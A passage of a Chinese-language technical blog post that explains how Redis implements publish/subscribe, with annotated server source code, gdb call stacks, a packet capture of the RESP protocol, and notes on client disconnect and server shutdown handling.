<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">punsubscribeCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;argc == <span class="number">1</span>) &#123;</span><br><span class="line">        pubsubUnsubscribeAllPatterns(c,<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++)</span><br><span class="line">            pubsubUnsubscribePattern(c,c-&gt;argv[j],<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientSubscriptionsCount(c) == <span class="number">0</span>) c-&gt;flags &amp;= ~CLIENT_PUBSUB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubUnsubscribePattern</span><span class="params">(client *c, robj *pattern, <span class="type">int</span> notify)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients;</span><br><span class="line">    listNode *ln;</span><br><span class="line">    pubsubPattern pat;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    incrRefCount(pattern); <span class="comment">/* Protect the object. May be the same we remove */</span></span><br><span class="line">    <span class="keyword">if</span> ((ln = listSearchKey(c-&gt;pubsub_patterns,pattern)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        listDelNode(c-&gt;pubsub_patterns,ln);</span><br><span class="line">        pat.client = c;</span><br><span class="line">        pat.pattern = pattern;</span><br><span class="line">        ln = listSearchKey(server.pubsub_patterns,&amp;pat);</span><br><span class="line">        listDelNode(server.pubsub_patterns,ln);			<span class="comment">// 在pubsub_patterns链表中查找这个客户端并删除。</span></span><br><span class="line">        <span class="comment">/* Remove the client from the pattern -&gt; clients list hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_patterns_dict,pattern);</span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,de != <span class="literal">NULL</span>);</span><br><span class="line">        clients = dictGetVal(de);</span><br><span class="line">        ln = listSearchKey(clients,c);	<span class="comment">// 查找pubsub_patterns_dict字典，找到客户端链表，在链表中删除这个客户端节点</span></span><br><span class="line">        serverAssertWithInfo(c,<span class="literal">NULL</span>,ln != <span class="literal">NULL</span>);</span><br><span class="line">        listDelNode(clients,ln);</span><br><span class="line">        <span class="keyword">if</span> (listLength(clients) == <span class="number">0</span>) &#123;	<span class="comment">// 如果删除节点后的链表长度为0，把键pattern也从字典中删除。</span></span><br><span class="line">            <span class="comment">/* Free the list and associated hash entry at all if this was</span></span><br><span class="line"><span class="comment">             * the latest client. */</span></span><br><span class="line">            dictDelete(server.pubsub_patterns_dict,pattern);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    <span class="keyword">if</span> (notify) addReplyPubsubPatUnsubscribed(c,pattern);</span><br><span class="line">    decrRefCount(pattern);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3><span id="发送消息-publish命令的实现">发送消息 —— PUBLISH命令的实现<span id="jump5"></span></span></h3><p>客户端执行<code>PUBLISH channel message</code>命令时，Redis服务器将执行如下两个重要操作：</p>
<ul>
<li>首先，查找<code>pubsub_channels</code>字典，将消息发送给这个频道的所有订阅者。</li>
<li>其次，查找<code>pubsub_patterns_dict</code>字典，找出所有匹配这个频道的模式，再将消息发送给这些模式的订阅者。</li>
</ul>
<p>发布消息的源码实现参考<code>publishCommand</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">publishCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> receivers = pubsubPublishMessage(c-&gt;argv[<span class="number">1</span>],c-&gt;argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (server.cluster_enabled)</span><br><span class="line">        clusterPropagatePublish(c-&gt;argv[<span class="number">1</span>],c-&gt;argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        forceCommandPropagation(c,PROPAGATE_REPL);</span><br><span class="line">    addReplyLongLong(c,receivers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubPublishMessage</span><span class="params">(robj *channel, robj *message)</span> &#123;</span><br><span class="line">    <span class="type">int</span> receivers = <span class="number">0</span>;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    dictIterator *di;</span><br><span class="line">    listNode *ln;</span><br><span class="line">    listIter li;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1、先查找频道字典`pubsub_channels` ，将消息发送给这个频道的所有订阅者</span></span><br><span class="line">    de = dictFind(server.pubsub_channels,channel);</span><br><span class="line">    <span class="keyword">if</span> (de) &#123;</span><br><span class="line">        <span class="built_in">list</span> *<span class="built_in">list</span> = dictGetVal(de);</span><br><span class="line">        listNode *ln;</span><br><span class="line">        listIter li;</span><br><span class="line"></span><br><span class="line">        listRewind(<span class="built_in">list</span>,&amp;li);</span><br><span class="line">        <span class="keyword">while</span> ((ln = listNext(&amp;li)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            client *c = ln-&gt;value;</span><br><span class="line">            addReplyPubsubMessage(c,channel,message);	<span class="comment">// 将消息发送给这个频道的所有订阅者</span></span><br><span class="line">            receivers++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2、再查找模式字典pubsub_patterns_dict, 找出所有匹配这个channel的模式，将消息发送给这些模式的所有订阅者</span></span><br><span class="line">    di = dictGetIterator(server.pubsub_patterns_dict);</span><br><span class="line">    <span class="keyword">if</span> (di) &#123;</span><br><span class="line">        channel = getDecodedObject(channel);</span><br><span class="line">        <span class="keyword">while</span>((de = dictNext(di)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            robj *pattern = dictGetKey(de);</span><br><span class="line">            <span class="built_in">list</span> *clients = dictGetVal(de);</span><br><span class="line">            <span class="keyword">if</span> (!stringmatchlen((<span class="type">char</span>*)pattern-&gt;ptr,	<span class="comment">// 判断模式是否与频道channel匹配</span></span><br><span class="line">                                sdslen(pattern-&gt;ptr),</span><br><span class="line">                                (<span class="type">char</span>*)channel-&gt;ptr,</span><br><span class="line">                                sdslen(channel-&gt;ptr),<span class="number">0</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历这个模式的客户端链表，将消息发送到所有订阅这个模式的客户端。</span></span><br><span class="line">            listRewind(clients,&amp;li);</span><br><span class="line">            <span class="keyword">while</span> ((ln = listNext(&amp;li)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                client *c = listNodeValue(ln);</span><br><span class="line">                addReplyPubsubPatMessage(c,pattern,channel,message);</span><br><span class="line">                receivers++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        decrRefCount(channel);</span><br><span class="line">        dictReleaseIterator(di);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> receivers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合源码，可以看出<strong>Redis发布订阅的特点</strong>：<span id="jump6"></span></p>
<ul>
<li><p>发布的消息不保留在内存。也就是说，必须先有订阅者，发布者发送的消息才有意义。</p>
</li>
<li><p>订阅的模式名称支持<code>glob</code>风格的匹配符，示例参考：<a href="https://blog.huangz.me/diary/2013/redis-pubsub-glob-pattern-example.html">Redis 发布与订阅模式匹配符示例</a></p>
</li>
</ul>
<h4><span id="为什么设计pubsub_patterns_dict字典有什么好处">为什么设计pubsub_patterns_dict字典，有什么好处？<span id="jump7"></span></span></h4><p>假设有N个客户端, 每个客户端订阅了1个模式；如果只使用链表，判断所有模式是否与指定频道匹配的次数固定为N次，效率较低。</p>
<p>由于实际场景中，<font color="blue">存在同一个模式被多个客户端订阅的场景</font>，所以设计<code>pubsub_patterns_dict</code>字典的好处在于，将这个判断次数从N次降低为最多N次，提高效率。</p>
<h3><span id="一次完整的redis订阅-发布流程分析">一次完整的Redis订阅、发布流程分析<span id="jump10"></span></span></h3><p>假设有1个频道订阅者和1个消息发布者，一次完整的Redis订阅、发布流程如下图所示：<br><img data-src="/2022/0129204852/image5.png"></p>
<h4><span id="为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令">为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令？<span id="jump11"></span></span></h4><p>观察流程图中的第5步，订阅者成功建立长连接后，会进入while死循环，每次循环调用函数<code>cliReadReply</code>读取一条频道的消息，所以无法再执行<code>unsubscribe</code>命令。redis-cli的调用栈参考如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x00007ffff7e5d5b0</span> in __libc_recv (fd=<span class="number">3</span>, buf=<span class="number">0x7fffffffa200</span>, len=<span class="number">16384</span>, flags=flags@entry=<span class="number">0</span>) at ../sysdeps/unix/sysv/linux/recv.c:<span class="number">28</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x000055555558ec0b</span> in <span class="title function_">recv</span> <span class="params">(__flags=<span class="number">0</span>, __n=&lt;optimized out&gt;, __buf=&lt;optimized out&gt;, __fd=&lt;optimized out&gt;)</span></span><br><span class="line">    at /usr/include/x86_64-linux-gnu/bits/socket2.h:44</span><br><span class="line">#2  <span class="title function_">redisNetRead</span> <span class="params">(c=<span class="number">0x555555841300</span>, buf=&lt;optimized out&gt;, bufcap=&lt;optimized out&gt;)</span> at net.c:61</span><br><span class="line">#3  0x0000555555587702 in <span class="title function_">redisBufferRead</span> <span class="params">(c=<span class="number">0x555555841300</span>)</span> at hiredis.c:881</span><br><span class="line">#4  0x0000555555587a92 in <span class="title function_">main</span> <span class="params">(c=<span class="number">0x555555841300</span>, reply=<span class="number">0x7fffffffe280</span>)</span> at hiredis.c:954</span><br><span class="line">#5  0x000055555557fadd in <span class="title function_">cliReadReply</span> <span class="params">(output_raw_strings=<span class="number">0</span>)</span> at redis-cli.c:1204</span><br><span class="line">#6  0x0000555555581e0d in <span class="title function_">cliSendCommand</span> <span class="params">(argc=<span class="number">2</span>, argv=<span class="number">0x7ffff780a000</span>, repeat=<span class="number">0</span>)</span> at redis-cli.c:1361</span><br><span class="line">#7  0x0000555555582006 in <span class="title function_">issueCommandRepeat</span> <span class="params">(argc=<span class="number">2</span>, argv=<span class="number">0x7ffff780a000</span>, repeat=<span class="number">1</span>)</span> at redis-cli.c:1858</span><br><span class="line">#8  0x000055555556dd8d in <span class="title function_">issueCommand</span> <span class="params">(argv=<span class="number">0x7ffff780a000</span>, argc=&lt;optimized out&gt;)</span> at redis-cli.c:2090</span><br><span class="line">#9  <span class="title function_">noninteractive</span> <span class="params">(argv=<span class="number">0x7ffff780a000</span>, argc=&lt;optimized out&gt;)</span> at redis-cli.c:2090</span><br><span class="line">#10 <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;)</span> at redis-cli.c:8251</span><br></pre></td></tr></table></figure>



<h4><span id="tcp是没有消息边界的订阅者是如何保证正确解析发布者的消息"><span id="jump12"></span></span></h4><p>考虑如下场景，发布者依次发布两条消息到服务端，假设消息内容分别为”hello” “world”。由于TCP协议是没有消息边界的，如果客户端仅通过循环调用<code>read()</code>的方式读取消息，可能会发生如下不符合预期的情况：</p>
<ul>
<li><code>read</code>只调用了1次，返回的是”helloworld”</li>
<li><code>read</code>调用了2次，但返回的是”hell” “oworld”，或者”hellowor” “ld”，等等。</li>
<li><code>read</code>调用了3次，依次返回”hell”, “owo”, “rld”</li>
<li>……</li>
</ul>
<p>针对以上的TCP无消息边界问题，一般有如下3种常见的解决策略：</p>
<ul>
<li>每次只发送固定长度的消息</li>
<li>把消息的大小和内容一并发送</li>
<li>使用特殊标记划分消息边界</li>
</ul>
<p>其中，Redis采用第三种策略，即通过自定义RESP协议的方式，使用CRLF(<code>\r\n</code>)作为消息边界。</p>
<p>比如服务器向客户端回复消息”subscribe channel1 1”，对应的TCP报文内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15:36:47.498803 IP localhost.6379 &gt; localhost.50208: Flags [P.], seq 1:38, ack 34, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 37: RESP &quot;subscribe&quot; &quot;channel1&quot; &quot;1&quot;</span><br><span class="line">        0x0000:  4500 0059 d241 4000 4006 6a5b 7f00 0001  E..Y.A@.@.j[....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd66 c0c1 f5d6  .........z.f....</span><br><span class="line">        0x0020:  8018 0200 fe4d 0000 0101 080a dcdf ed32  .....M.........2</span><br><span class="line">        0x0030:  dcdf ed32 2a33 0d0a 2439 0d0a 7375 6273  ...2*3..$9..subs</span><br><span class="line">        0x0040:  6372 6962 650d 0a24 380d 0a63 6861 6e6e  cribe..$8..chann</span><br><span class="line">        0x0050:  656c 310d 0a3a 310d 0a                   el1..:1..</span><br></pre></td></tr></table></figure>
<h5><span id="附一次订阅中的连接建立请求消息的过程抓包结果"></span></h5><p>可以看出，”subscribe channel1 1”命令在TCP报文中存储的协议内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*3\r\n$9\r\nsubscribe\r\n$8\r\nchannel1\r\n:1</span><br></pre></td></tr></table></figure>

<p>协议内容的解析参考<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a> ， 以下只做简单的解释：</p>
<ul>
<li>*3 表示数组长度为3， 数组元素依次为 [“subscribe” channel1” “1”]</li>
<li>$9 表示字符串 “subscribe” 的长度</li>
<li>$8表示字符串 “channel1” 的长度</li>
<li>：表示类型为整数，:1表示第三个元素为整数，取值为1</li>
</ul>
<p>另外，客户端程序redis-cli中，通过封装函数<code>redisGetReply</code>获取一次完整的消息，而不是简单地循环调用read()，从而确保正确地解析服务器发送的消息。</p>
<h4><span id="订阅的客户端断线服务端是怎么感知的如何保证这个客户端的频道-模式订阅信息也被同步删除">订阅的客户端断线，服务端是怎么感知的？如何保证这个客户端的频道、模式订阅信息也被同步删除？<span id="jump8"></span></span></h4><p>假设1个客户端通过<code>redis-cli</code>订阅频道<code>channel1</code>之后，按下了Ctrl+C退出，此时服务器将依次发生如下操作：</p>
<ul>
<li>1、首先通过I&#x2F;O多路复用器(<code>select</code>&#x2F;<code>poll</code>&#x2F;<code>epoll</code>)监听这个客户端套接字的可读事件，触发命令请求处理的回调函数<code>readQueryFromClient</code>。调用链<code>aeMain -&gt; aeProcessEvents -&gt; readQueryFromClient -&gt; read</code>，调用栈参考：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt <span class="comment">// 1、首先通过I/O多路复用器监听这个客户端套接字的可读事件，触发命令请求处理的回调函数readQueryFromClient</span></span><br><span class="line">#<span class="number">0</span>  connSocketRead (conn=<span class="number">0x7fcbeae150c0</span>, buf=<span class="number">0x7fcbeae7cfc5</span>, buf_len=<span class="number">16384</span>) at connection.c:<span class="number">182</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x000056041195df03</span> in <span class="title function_">connRead</span> <span class="params">(buf_len=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, conn=&lt;optimized out&gt;)</span> at connection.h:152</span><br><span class="line">#2  <span class="title function_">readQueryFromClient</span> <span class="params">(conn=<span class="number">0x7fcbeae150c0</span>)</span> at networking.c:2026</span><br><span class="line">#3  0x00005604119e3e3c in <span class="title function_">callHandler</span> <span class="params">(handler=&lt;optimized out&gt;, conn=<span class="number">0x7fcbeae150c0</span>)</span> at connhelpers.h:79</span><br><span class="line">#4  <span class="title function_">connSocketEventHandler</span> <span class="params">(el=&lt;optimized out&gt;, fd=&lt;optimized out&gt;, clientData=<span class="number">0x7fcbeae150c0</span>, mask=&lt;optimized out&gt;)</span> at connection.c:296</span><br><span class="line">#5  0x0000560411942723 in <span class="title function_">aeProcessEvents</span> <span class="params">(eventLoop=eventLoop@entry=<span class="number">0x7fcbeae0b480</span>, flags=flags@entry=<span class="number">27</span>)</span> at ae.c:479</span><br><span class="line">#6  0x0000560411942a5d in <span class="title function_">aeMain</span> <span class="params">(eventLoop=<span class="number">0x7fcbeae0b480</span>)</span> at ae.c:539</span><br><span class="line">#7  0x000056041193eed8 in <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=<span class="number">0x7ffc77472d58</span>)</span> at server.c:5498</span><br><span class="line"><span class="params">(gdb)</span> n</span><br><span class="line">	<span class="type">int</span> ret = read(conn-&gt;fd, buf, buf_len); <span class="comment">// 2、调用read()读套接字, 发现返回值ret为0，从而感知到对端已关闭连接。</span></span><br><span class="line">(gdb) n</span><br><span class="line">	<span class="title function_">if</span> <span class="params">(!ret)</span> &#123;</span><br><span class="line">(gdb) p ret</span><br><span class="line">$<span class="number">2</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>2、<code>readQueryFromClient</code>中，<font color="red">调用read()读客户端套接字，发现返回值为0，从而感知到对端已关闭连接</font>，再调用函数<code>freeClientAsync</code>，异步地关闭这个客户端。<code>freeClientAsync</code>源码参考：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">freeClientAsync</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;flags &amp; CLIENT_CLOSE_ASAP || c-&gt;flags &amp; CLIENT_LUA) <span class="keyword">return</span>;</span><br><span class="line">    c-&gt;flags |= CLIENT_CLOSE_ASAP;</span><br><span class="line">    <span class="keyword">if</span> (server.io_threads_num == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* no need to bother with locking if there&#x27;s just one thread (the main thread) */</span></span><br><span class="line">        listAddNodeTail(server.clients_to_close,c);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_mutex_t</span> async_free_queue_mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line">    pthread_mutex_lock(&amp;async_free_queue_mutex);</span><br><span class="line">    listAddNodeTail(server.clients_to_close,c);</span><br><span class="line">    pthread_mutex_unlock(&amp;async_free_queue_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，<code>freeClientAsync</code>的实现很简单，只是把这个客户端加入服务器链表<code>clients_to_close</code>， 并不立即释放这个客户端，所以说是<strong>异步</strong>地关闭。</p>
<ul>
<li>3、在下一次事件循环中，调用<code>freeClientsInAsyncFreeQueue</code>从服务器链表<code>clients_to_close</code>取出待释放的客户端；再调用<code>freeClient</code>真正地释放这个客户端，<font color="red">接着调用<code>pubsubUnsubscribeAllChannels</code>保证这个客户端的频道和模式订阅信息被同步删除</font>。调用链：<code>aeMain -&gt; aeProcessEvents -&gt;  beforeSleep -&gt; freeClientsInAsyncFreeQueue -&gt; freeClient</code>, 调用栈参考如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#<span class="number">0</span>  dictGenericDelete (d=<span class="number">0x7fcbeae0d2e0</span>, key=key@entry=<span class="number">0x7fcbeae0e360</span>, nofree=nofree@entry=<span class="number">0</span>) at dict.c:<span class="number">393</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000560411944bdf</span> in <span class="title function_">dictDelete</span> <span class="params">(ht=&lt;optimized out&gt;, key=key@entry=<span class="number">0x7fcbeae0e360</span>)</span> at dict.c:406</span><br><span class="line">#2  0x000056041198e2bf in <span class="title function_">pubsubUnsubscribeChannel</span> <span class="params">(c=c@entry=<span class="number">0x7fcbeaf4d700</span>, channel=<span class="number">0x7fcbeae0e360</span>, notify=notify@entry=<span class="number">0</span>)</span> at pubsub.c:198</span><br><span class="line">#3  0x000056041198e5bd in <span class="title function_">pubsubUnsubscribeAllChannels</span> <span class="params">(c=c@entry=<span class="number">0x7fcbeaf4d700</span>, notify=notify@entry=<span class="number">0</span>)</span> at pubsub.c:284</span><br><span class="line">#4  0x0000560411957cf7 in <span class="title function_">freeClient</span> <span class="params">(c=<span class="number">0x7fcbeaf4d700</span>)</span> at networking.c:1251</span><br><span class="line">#5  0x00005604119584fd in <span class="title function_">freeClientsInAsyncFreeQueue</span> <span class="params">()</span> at networking.c:1345</span><br><span class="line">#6  0x000056041194634b in <span class="title function_">beforeSleep</span> <span class="params">(eventLoop=&lt;optimized out&gt;)</span> at server.c:2204</span><br><span class="line">#7  <span class="title function_">beforeSleep</span> <span class="params">(eventLoop=&lt;optimized out&gt;)</span> at server.c:2117</span><br><span class="line">#8  0x00005604119425e8 in <span class="title function_">aeProcessEvents</span> <span class="params">(eventLoop=eventLoop@entry=<span class="number">0x7fcbeae0b480</span>, flags=flags@entry=<span class="number">27</span>)</span> at ae.c:443</span><br><span class="line">#9  0x0000560411942a5d in <span class="title function_">aeMain</span> <span class="params">(eventLoop=<span class="number">0x7fcbeae0b480</span>)</span> at ae.c:539</span><br><span class="line">#10 0x000056041193eed8 in <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=<span class="number">0x7ffc77472d58</span>)</span> at server.c:5498</span><br></pre></td></tr></table></figure>

<p><code>freeClientsInAsyncFreeQueue</code>的源码实现参考如下，逻辑很简单，就是从服务器链表<code>client_to_close</code>中依次取出并释放所有的客户端。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">freeClientsInAsyncFreeQueue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> freed = <span class="number">0</span>;</span><br><span class="line">    listIter li;</span><br><span class="line">    listNode *ln;</span><br><span class="line"></span><br><span class="line">    listRewind(server.clients_to_close,&amp;li);	<span class="comment">// 从clients_to_close链表中依次取出所有客户端，并释放这个客户端。</span></span><br><span class="line">    <span class="keyword">while</span> ((ln = listNext(&amp;li)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        client *c = listNodeValue(ln);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;flags &amp; CLIENT_PROTECTED) <span class="keyword">continue</span>;</span><br><span class="line">        c-&gt;flags &amp;= ~CLIENT_CLOSE_ASAP;</span><br><span class="line">        freeClient(c);</span><br><span class="line">        listDelNode(server.clients_to_close,ln);</span><br><span class="line">        freed++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> freed;	<span class="comment">// 返回释放的客户端总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="服务器正常关闭场景正在订阅的客户端是怎么感知到服务器离线的">服务器正常关闭场景，正在订阅的客户端是怎么感知到服务器离线的？<span id="jump9"></span></span></h4><p>这里仅讨论服务器正常关闭的场景，即客户端发送SHUTDOWN命令关闭服务端。此时服务端将执行如下操作：</p>
<ul>
<li>1、接受客户端的SHUTDOWN命令，调用函数<code>shutdownCommand</code>处理这个关闭请求。调用链<code>aeMain -&gt; processInputBuffer -&gt; shutdownCommand </code>，调用栈如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#<span class="number">0</span>  closeListeningSockets (unlink_unix_socket=<span class="number">1</span>) at server.c:<span class="number">3809</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000562ee4b31992</span> in <span class="title function_">prepareForShutdown</span> <span class="params">(flags=&lt;optimized out&gt;, flags@entry=<span class="number">0</span>)</span> at server.c:3916</span><br><span class="line">#2  0x0000562ee4b4bbdb in <span class="title function_">shutdownCommand</span> <span class="params">(c=<span class="number">0x7ff3c594dd80</span>)</span> at db.c:1061</span><br><span class="line">#3  0x0000562ee4b30701 in <span class="title function_">call</span> <span class="params">(c=<span class="number">0x7ff3c594dd80</span>, flags=<span class="number">15</span>)</span> at server.c:3368</span><br><span class="line">#4  0x0000562ee4b311c6 in <span class="title function_">processCommand</span> <span class="params">(c=c@entry=<span class="number">0x7ff3c594dd80</span>)</span> at server.c:3797</span><br><span class="line">#5  0x0000562ee4b3fca4 in <span class="title function_">processCommandAndResetClient</span> <span class="params">(c=c@entry=<span class="number">0x7ff3c594dd80</span>)</span> at networking.c:1895</span><br><span class="line">#6  0x0000562ee4b448fa in <span class="title function_">processInputBuffer</span> <span class="params">(c=<span class="number">0x7ff3c594dd80</span>)</span> at networking.c:1978</span><br><span class="line">#7  0x0000562ee4bcae3c in <span class="title function_">callHandler</span> <span class="params">(handler=&lt;optimized out&gt;, conn=<span class="number">0x7ff3c58150c0</span>)</span> at connhelpers.h:79</span><br><span class="line">#8  <span class="title function_">connSocketEventHandler</span> <span class="params">(el=&lt;optimized out&gt;, fd=&lt;optimized out&gt;, clientData=<span class="number">0x7ff3c58150c0</span>, mask=&lt;optimized out&gt;)</span> at connection.c:296</span><br><span class="line">#9  0x0000562ee4b29723 in <span class="title function_">aeProcessEvents</span> <span class="params">(eventLoop=eventLoop@entry=<span class="number">0x7ff3c580b480</span>, flags=flags@entry=<span class="number">27</span>)</span> at ae.c:479</span><br><span class="line">#10 0x0000562ee4b29a5d in <span class="title function_">aeMain</span> <span class="params">(eventLoop=<span class="number">0x7ff3c580b480</span>)</span> at ae.c:539</span><br><span class="line">#11 0x0000562ee4b25ed8 in <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=<span class="number">0x7ffe9a269bf8</span>)</span> at server.c:5498</span><br></pre></td></tr></table></figure>

<ul>
<li>2、接着调用<code>closeListeningSockets</code>关闭listen套接字，之后再调用<code>exit</code>退出服务器程序。源码参考如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">closeListeningSockets</span><span class="params">(<span class="type">int</span> unlink_unix_socket)</span> &#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="comment">// 调用close(), 关闭服务端的listen套接字</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.ipfd_count; j++) close(server.ipfd[j]);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.tlsfd_count; j++) close(server.tlsfd[j]);</span><br><span class="line">    <span class="keyword">if</span> (server.sofd != <span class="number">-1</span>) close(server.sofd);</span><br><span class="line">    <span class="keyword">if</span> (server.cluster_enabled)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.cfd_count; j++) close(server.cfd[j]);</span><br><span class="line">    <span class="keyword">if</span> (unlink_unix_socket &amp;&amp; server.unixsocket) &#123;</span><br><span class="line">        serverLog(LL_NOTICE,<span class="string">&quot;Removing the unix socket file.&quot;</span>);</span><br><span class="line">        unlink(server.unixsocket); <span class="comment">/* don&#x27;t care if this fails */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3、客户端通过死循环调用<code>redisGetReply</code>获取订阅信息，而<code>redisGetReply</code>最终是通过系统调用<code>recv</code>读取套接字数据，<font color="red">当服务器调用exit退出后，客户端的<code>recv</code>调用会返回0，从而感知到服务器离线，</font>最终调用<code>exit</code>退出客户端程序。调用栈参考：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  0x00007ffff7e5d5b0 in __libc_recv (fd=3, buf=0x7fffffffa200, len=16384, flags=flags@entry=0) at ../sysdeps/unix/sysv/linux/recv.c:28</span><br><span class="line">#1  0x000055555558ec0b in recv (__flags=0, __n=&lt;optimized out&gt;, __buf=&lt;optimized out&gt;, __fd=&lt;optimized out&gt;)</span><br><span class="line">    at /usr/include/x86_64-linux-gnu/bits/socket2.h:44</span><br><span class="line">#2  redisNetRead (c=0x555555841300, buf=&lt;optimized out&gt;, bufcap=&lt;optimized out&gt;) at net.c:61</span><br><span class="line">#3  0x0000555555587702 in redisBufferRead (c=0x555555841300) at hiredis.c:881</span><br><span class="line">#4  0x0000555555587a92 in redisGetReply (c=0x555555841300, reply=0x7fffffffe280) at hiredis.c:954</span><br><span class="line">#5  0x000055555557fadd in cliReadReply (output_raw_strings=0) at redis-cli.c:1204</span><br><span class="line">#6  0x0000555555581e0d in cliSendCommand (argc=2, argv=0x7ffff780a000, repeat=0) at redis-cli.c:1361</span><br><span class="line">#7  0x0000555555582006 in issueCommandRepeat (argc=2, argv=0x7ffff780a000, repeat=1) at redis-cli.c:1858</span><br><span class="line">#8  0x000055555556dd8d in issueCommand (argv=0x7ffff780a000, argc=&lt;optimized out&gt;) at redis-cli.c:2090</span><br><span class="line">#9  noninteractive (argv=0x7ffff780a000, argc=&lt;optimized out&gt;) at redis-cli.c:2090</span><br><span class="line">#10 main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at redis-cli.c:8251</span><br></pre></td></tr></table></figure>



